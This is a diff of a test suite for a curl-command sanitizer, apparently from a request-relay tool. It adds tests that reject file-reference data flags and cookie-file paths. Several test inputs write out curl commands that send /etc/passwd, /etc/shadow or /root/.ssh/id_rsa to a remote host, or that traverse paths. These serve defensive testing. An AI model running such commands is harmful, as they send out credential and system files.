@@ -204,7 +204,7 @@ describe("sanitize", () => {
     });
 
     it("accepts -F with valid file path", () => {
-      const result = sanitize("curl -F 'file=@/tmp/reqify-uploads/user/abc.txt' https://example.com");
+      const result = sanitize("curl -F 'file=@/tmp/relay-uploads/user/abc.txt' https://example.com");
       expect(result.valid).toBe(true);
     });
 
@@ -215,13 +215,107 @@ describe("sanitize", () => {
     });
 
     it("rejects -F with path traversal", () => {
-      const result = sanitize("curl -F 'file=@/tmp/reqify-uploads/../../../etc/passwd' https://example.com");
+      const result = sanitize("curl -F 'file=@/tmp/relay-uploads/../../../etc/passwd' https://example.com");
       expect(result.valid).toBe(false);
       expect(result.error).toContain("traversal");
     });
 
     it("accepts --form long flag", () => {
       const result = sanitize("curl --form 'key=val' https://example.com");
+      expect(result.valid).toBe(true);
+    });
+  });
+
+  describe("data flag file reference blocking", () => {
+    it("rejects -d with @file reference", () => {
+      const result = sanitize("curl -d @/etc/passwd https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data with @file reference", () => {
+      const result = sanitize("curl --data @/etc/passwd https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data-raw with @file reference", () => {
+      const result = sanitize("curl --data-raw @/tmp/secret https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data-binary with @file reference", () => {
+      const result = sanitize("curl --data-binary @/tmp/secret https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data=@file (equals syntax)", () => {
+      const result = sanitize("curl --data=@/etc/passwd https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data-raw=@file (equals syntax)", () => {
+      const result = sanitize("curl --data-raw=@/etc/shadow https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("rejects --data-binary=@file (equals syntax)", () => {
+      const result = sanitize("curl --data-binary=@/root/.ssh/id_rsa https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("File references");
+    });
+
+    it("allows -d with normal JSON body", () => {
+      const result = sanitize(`curl -d '{"key":"value"}' https://example.com`);
+      expect(result.valid).toBe(true);
+    });
+
+    it("allows -d with body containing @ not at start", () => {
+      const result = sanitize(`curl -d '{"email":"user@example.com"}' https://example.com`);
+      expect(result.valid).toBe(true);
+    });
+
+    it("allows --data=value (equals syntax, no @)", () => {
+      const result = sanitize("curl --data=hello https://example.com");
+      expect(result.valid).toBe(true);
+    });
+  });
+
+  describe("cookie flag file reference blocking", () => {
+    it("rejects -b with bare file path", () => {
+      const result = sanitize("curl -b /tmp/cookies.txt https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("Cookie file");
+    });
+
+    it("rejects --cookie with bare file path", () => {
+      const result = sanitize("curl --cookie /tmp/cookies.txt https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("Cookie file");
+    });
+
+    it("rejects --cookie=/path (equals syntax, no = in value)", () => {
+      const result = sanitize("curl --cookie=/tmp/cookies.txt https://example.com");
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain("Cookie file");
+    });
+
+    it("allows -b with inline cookie (key=value)", () => {
+      const result = sanitize("curl -b 'session=abc123' https://example.com");
+      expect(result.valid).toBe(true);
+    });
+
+    it("allows -b with multiple inline cookies", () => {
+      const result = sanitize("curl -b 'session=abc; token=xyz' https://example.com");
+      expect(result.valid).toBe(true);
+    });
+
+    it("allows --cookie=key=value (equals syntax with inline cookie)", () => {
+      const result = sanitize("curl --cookie=session=abc123 https://example.com");
       expect(result.valid).toBe(true);
     });
   });
